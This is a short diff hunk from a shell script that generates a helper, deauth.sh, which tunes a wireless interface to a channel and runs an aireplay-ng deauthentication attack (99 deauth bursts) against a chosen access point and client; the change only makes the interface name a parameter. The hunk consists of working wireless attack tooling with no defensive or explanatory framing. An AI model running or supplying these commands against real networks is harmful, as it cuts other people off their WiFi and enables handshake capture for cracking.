@@ -59,7 +59,7 @@ airodump-ng --manufacturer --beacons --showack --wps --uptime \
 cat >> deauth.sh << "EndOfMessage"
 iwconfig wlan1 channel $1
 
-aireplay-ng -0 99 -D -a $2 -c $3 wlan1
+aireplay-ng -0 99 -D -a $2 -c $3 $4
 EndOfMessage
 
 chmod +x deauth.sh
